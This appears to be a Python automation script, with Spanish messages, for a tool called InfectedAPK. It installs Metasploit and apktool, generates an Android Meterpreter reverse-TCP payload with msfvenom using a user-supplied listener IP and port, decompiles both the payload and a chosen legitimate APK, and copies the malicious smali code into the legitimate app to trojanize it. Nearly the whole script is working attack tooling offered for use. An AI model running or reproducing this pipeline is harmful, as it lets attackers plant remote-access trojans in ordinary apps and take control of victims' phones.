#!/usr/bin/env python3

import os
import subprocess
import sys
import urllib.request

def clonarRepo(repoUrl, rutaDispositivo):
    if not os.path.exists(rutaDispositivo):
        print(f"\nClonando repositorio {repoUrl} en la ruta {rutaDispositivo}.\n")
        os.makedirs(rutaDispositivo)
        resultClonRepo = subprocess.run(["git", "clone", repoUrl, rutaDispositivo])

        if resultClonRepo.returncode == 0:
            print("\nRepositorio clonado con éxito.\n")
        else:
            print("\nError al clonar el repositorio.\n")
            sys.exit(1)

def verificar_programa_linux(programa):
    result_verificar_programas_linux = subprocess.run(["which", programa])
    return result_verificar_programas_linux.returncode == 0

def instalar_dependencias_linux(move_script_to_Tools_directory):
    if not verificar_programa_linux("java") or not verificar_programa_linux("curl") or not verificar_programa_linux("msfvenom") or not verificar_programa_linux("git"):
        result_update=subprocess.run(["sudo", "apt-get", "update"])

        if result_update.returncode == 0:
            print("\nUpdate realizado con éxito.\n")

        else:
            print(f"\nError al realizar update:\n")
            sys.exit(1)

    if not verificar_programa_linux("java"):
        print("Instalando Java en Linux...")
        result_install_java = subprocess.run(["sudo", "apt-get", "install", "-y", "default-jre", "default-jdk"])

        if result_install_java.returncode == 0:
            print("\nJava instalado con éxito.\n")

        else:
            print(f"\nError al instalar Java en Linux:\n")
            sys.exit(1)

    if not verificar_programa_linux("curl"):
        print("\nInstalando Curl en Linux...\n")
        result_install_curl = subprocess.run(["sudo", "apt-get", "install", "-y", "curl"])

        if result_install_curl.returncode == 0:
            print("\nCurl instalado con éxito.\n")

        else:
            print(f"\nError al instalar Curl en Linux:\n")
            sys.exit(1)

    if not verificar_programa_linux("msfvenom"):
        print("\nInstalando Metasploit en Linux...\n")
        result_download_metasploit_script = subprocess.run(["curl", "https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb", "-o", "msfinstall"], check=True, capture_output=True, text=True)
        result_change_permissions_msfscript = subprocess.run(["chmod", "755", "msfinstall"])
        result_execute_msfscript = subprocess.run(["./msfinstall"])
        result_mv_msfscript = subprocess.run(["mv", "msfinstall", move_script_to_Tools_directory])

        if result_download_metasploit_script.returncode == 0 and result_change_permissions_msfscript.returncode == 0 and result_execute_msfscript.returncode == 0 and result_mv_msfscript.returncode == 00:
            print("\nMetasploit instalado con éxito.\n")

        else:
            print(f"\nError al instalar Metasploit en Linux:\n")
            sys.exit(1)

    if not verificar_programa_linux("git"):
        print("\nInstalando GIT en Linux...\n")
        result_install_git = subprocess.run(["sudo", "apt-get", "install", "-y", "git"])

        if result_install_git.returncode == 0:
            print("\nGIT instalado con éxito.\n")

        else:
            print(f"\nError al instalar GIT en Linux:\n")
            sys.exit(1)

def configureApktool_linux(originRoute, destinantionRoute):
    if not os.path.exists(destinantionRoute):
        print(f"\nCopiando apktool y estableciando permisos...")
        resultCopyApktool = subprocess.run(["cp", originRoute, destinantionRoute])
        resultGivePermissions = subprocess.run(["chmod", "+x", destinantionRoute])

        if resultCopyApktool.returncode == 0 and resultGivePermissions.returncode == 0:
            print("apktool configurado con éxito.")
        else:
            print("Error al configurar apktool.")
            sys.exit(1)

def configureApktoolJar(originRouteJar, destinantionRouteJar):
    if not os.path.exists(destinantionRouteJar):
        print(f"\nCopiando apktool.jar y estableciando permisos...")
        resultCopyApktoolJar = subprocess.run(["cp", originRouteJar, destinantionRouteJar])
        resultGivePermissionsJar = subprocess.run(["chmod", "+x", destinantionRouteJar])

        if resultCopyApktoolJar.returncode == 0 and resultGivePermissionsJar.returncode == 0:
            print("apktool.jar configurado con éxito.")
        else:
            print("Error al configurar apktool.jar")
            sys.exit(1)

def menu_linux_descomprimir_apk(ruta_apks):
    if not os.path.exists(ruta_apks):
        print(f"\nError: La ruta {ruta_apks} no existe.\n")
        return

    apks = [f for f in os.listdir(ruta_apks) if f.endswith(".apk.zip")]

    if not apks:
        print(f"\nNo se encontraron archivos APK en la ruta {ruta_apks}.")
        return

    print("\nAPKs disponibles para descomprimir:")
    for idx, apk in enumerate(apks, start=1):
        print(f"{idx}. {apk}")

    try:
        seleccion = int(input("\nSeleccione el número del APK que desea descomprimir: "))
        if seleccion < 1 or seleccion > len(apks):
            print("Selección inválida.")
            return

        apk_seleccionado = apks[seleccion - 1]
        print(f"\nHa seleccionado descomprimir: {apk_seleccionado}")

        apk_path = os.path.join(ruta_apks, apk_seleccionado)

        # Descomprimir el archivo .zip directamente al directorio
        resultUnzipCompressedApk = subprocess.run(["unzip", "-j", apk_path, "-d", ruta_apks])

        if resultUnzipCompressedApk.returncode == 0:
            print(f"\nAPK {apk_seleccionado} descomprimido con éxito en {ruta_apks}.")
            # Verificar que el archivo .apk esté presente antes de descompilar
            apk_file = os.path.join(ruta_apks, os.path.basename(apk_seleccionado).replace(".apk.zip", ".apk"))
            if os.path.exists(apk_file):
                decompileApk(apk_file)
            else:
                print(f"\nError: No se encontró el archivo APK descomprimido en {ruta_apks}.")
                sys.exit(1)
        else:
            print(f"\nError al descomprimir el APK {apk_seleccionado}.")
            sys.exit(1)

    except ValueError:
        print("\nEntrada inválida. Por favor ingrese un número.")

def decompileApk(apk_file):
    # Eliminar la extensión .apk
    apk_file_without_extension = os.path.splitext(apk_file)[0]

    # Verificar si el archivo APK existe y es legible
    if os.path.exists(apk_file) and os.access(apk_file, os.R_OK):
        # Verificar si el directorio ya existe
        if os.path.exists(apk_file_without_extension):
            print(f"\n\nBorrando antiguo decompilado y decompilando nuevamente...\n")
            # Intentar eliminar el directorio previamente decompilado
            try:
                subprocess.run(["rm", "-rf", apk_file_without_extension], check=True)
                print(f"Antiguo directorio decompilado eliminado correctamente.")
            except subprocess.CalledProcessError as e:
                print(f"Error al eliminar el directorio antiguo decompilado: {e}")
                sys.exit(1)
                
        # Decompilar el APK
        print(f"\nDecompilando APK con apktool...\n")
        resultDecompileApk = subprocess.run(["apktool", "d", apk_file, "-o", apk_file_without_extension])

        # Verificar si la decompilación fue exitosa
        if resultDecompileApk.returncode == 0:
            print(f"\nAPK decompilado con éxito en {apk_file_without_extension}.")
        else:
            print(f"\nError al decompilar el APK en {apk_file}.")
            sys.exit(1)
    else:
        print(f"\nError: El archivo {apk_file} no existe o no tiene permisos de lectura.")
        sys.exit(1)

def msfvenomGenerateApk(trojanApkRoute):
    if not os.path.exists(trojanApkRoute):
        print("Generando troyano...\n")

        os.chdir("/home/Documents/InfectedAPK/APKs")
        localIP = input("Introduce tu IP local:")
        localPort = input("Introduce un puerto:")
        print("\n")

        comando = (
            f"msfvenom -p android/meterpreter/reverse_tcp "
            f"lhost={localIP} lport={localPort} R > trojan.apk"
        )

        msfvenomGenerateApkResult = subprocess.run(comando, shell=True)
        if msfvenomGenerateApkResult.returncode == 0:
            print("Payload generado con éxito.")
        else:
            print("Error al generar el payload.")

def evilApkDecompile(compiledEvilApk, decompiledEvilApk):
    if not os.path.exists(decompiledEvilApk):
        print(f"\n\n{compiledEvilApk}")
        print(f"Decompilando troyano.apk\n")

        evilApkDecompileResult = subprocess.run(["apktool", "d", compiledEvilApk, "-o", decompiledEvilApk])

        if evilApkDecompileResult.returncode == 0:
            print(f"\nApk maligno {compiledEvilApk} decompilado con éxito.")
        else:
            print(f"\nError al decompilar el APK maligno {compiledEvilApk}.")
            sys.exit(1)

def copyEvilSmali(ruta_apks, ruta_trojan_apk):
    if not os.path.exists(ruta_apks):
        print(f"\nError: No se encuentran APKs en {ruta_apks}.\n")
        return

    carpetas = [f for f in os.listdir(ruta_apks) if os.path.isdir(os.path.join(ruta_apks, f)) and f != 'trojan']

    if not carpetas:
        print(f"\nNo se encontraron proyectos para troyanizar en la ruta {ruta_apks}.")
        return

    print("\nProyectos disponibles en la ruta:")
    for idx, carpeta in enumerate(carpetas, start=1):
        print(f"{idx}. {carpeta}")

    try:
        seleccion = int(input("\nSeleccione el número del proyeccto que se va a troyanizar: "))
        if seleccion < 1 or seleccion > len(carpetas):
            print("Selección inválida.")
            return

        carpeta_seleccionada = carpetas[seleccion - 1]
        print(f"\nHa seleccionado troyanizar el proyecto: {carpeta_seleccionada}")

        carpeta_path = os.path.join(ruta_apks, carpeta_seleccionada)
        print(f"\nTroyanizando el proyecto: {carpeta_path}")

        ruta_smali_apk_legitima = os.path.join(carpeta_path, "smali", "smali", "com", "metasploit")
        copy_malicious_smali_to_apk_legit_route = os.path.join(carpeta_path, "smali")

        if not os.path.exists(ruta_smali_apk_legitima):
            print(f"\nCopiando ficheros Smali malignos a APK original.")
            os.chdir(ruta_trojan_apk)
            os.system(f"tar -cf - ./smali | (cd {copy_malicious_smali_to_apk_legit_route}; tar -xpf -)")

    except ValueError:
        print("\nEntrada inválida. Por favor ingrese un número.")

def verificar_programa_windows(programa):
    result_verificar_programas_windowsx = subprocess.run(["where", programa])
    return result_verificar_programas_windowsx.returncode == 0

def instalar_dependencias_windows():
    if not verificar_programa_windows("java"):
        print("Instalando Java en Windows...")
        result_install_java_windows = subprocess.run(["C:\\InfectedAPK\\dependencies_Windows\\JavaSetup8u431.exe", "/s"])

        if result_install_java_windows.returncode == 0:
            print("\nJava instalado con éxito.\n")

        else:
            print(f"\nError al instalar Java en Windows:\n")
            sys.exit(1)

    if not verificar_programa_windows("git"):
        print("Instalando GIT en Windows...")
        result_install_git_windows = subprocess.run(["C:\\InfectedAPK\\dependencies_Windows\\Git-2.47.1-64-bit.exe", "/VERYSILENT", "/NORESTART"])

        if result_install_git_windows.returncode == 0:
            print("\nGIT instalado con éxito.\n")

        else:
            print(f"\nError al instalar GIT en Windows:\n")
            sys.exit(1)

    if not os.path.exists("C:\\InfectedAPK\\dependencies_Windows\\metasploitframework-latest.msi"):
        print("Instalando Metasploit en Windows...")
        url = "https://windows.metasploit.com/metasploitframework-latest.msi"
        destination = "C:\\InfectedAPK\\dependencies_Windows\\metasploitframework-latest.msi"
        urllib.request.urlretrieve(url, destination)

        result_install_msfvenom = subprocess.run(["msiexec", "/i", "C:\\InfectedAPK\\dependencies_Windows\\metasploitframework-latest.msi", "/quiet", "/norestart"])
        print("Instalación completada con éxito.")

        if result_install_msfvenom.returncode == 0:
            print("\nMsfvenom instalado con éxito.\n")

        else:
            print(f"\nError al instalar Msfvenom en Windows:\n")
            sys.exit(1)

def main():
    sistema = os.name

    try:
        if sistema == "posix":
            repoUrl = "https://github.com/APKentiTEAM/InfectedAPK.git"
            rutaDispositivo = "/home/Documents/InfectedAPK"
            clonarRepo(repoUrl, rutaDispositivo)

            move_script_to_Tools_directory = "/home/Documents/InfectedAPK/Tools"
            instalar_dependencias_linux(move_script_to_Tools_directory)

            originRoute = "/home/Documents/InfectedAPK/Tools/apktool"
            destinantionRoute = "/usr/local/bin/apktool"
            configureApktool_linux(originRoute, destinantionRoute)

            originRouteJar = "/home/Documents/InfectedAPK/Tools/apktool.jar"
            destinantionRouteJar = "/usr/local/bin/apktool.jar"
            configureApktoolJar(originRouteJar, destinantionRouteJar)

            ruta_apks = "/home/Documents/InfectedAPK/APKs"
            menu_linux_descomprimir_apk(ruta_apks)

            trojanApkRoute = "/home/Documents/InfectedAPK/APKs/trojan.apk"
            msfvenomGenerateApk(trojanApkRoute)

            compiledEvilApk = "/home/Documents/InfectedAPK/APKs/trojan.apk"
            decompiledEvilApk = "/home/Documents/InfectedAPK/APKs/trojan"
            evilApkDecompile(compiledEvilApk, decompiledEvilApk)

            ruta_apks = "/home/Documents/InfectedAPK/APKs"
            ruta_trojan_apk = "/home/Documents/InfectedAPK/APKs/trojan/"
            copyEvilSmali(ruta_apks, ruta_trojan_apk)

        elif sistema == "nt":
            repoUrl = "https://github.com/APKentiTEAM/InfectedAPK.git"
            rutaDispositivo = "C:\\InfectedAPK"
            clonarRepo(repoUrl, rutaDispositivo)

            instalar_dependencias_windows()

        else:
            print(f"El sistema operativo {sistema} no es compatible.")
            sys.exit(1)

    except Exception as error:
        print(f"Error: {error}")
        sys.exit(1)

if __name__ == "__main__":
    main()
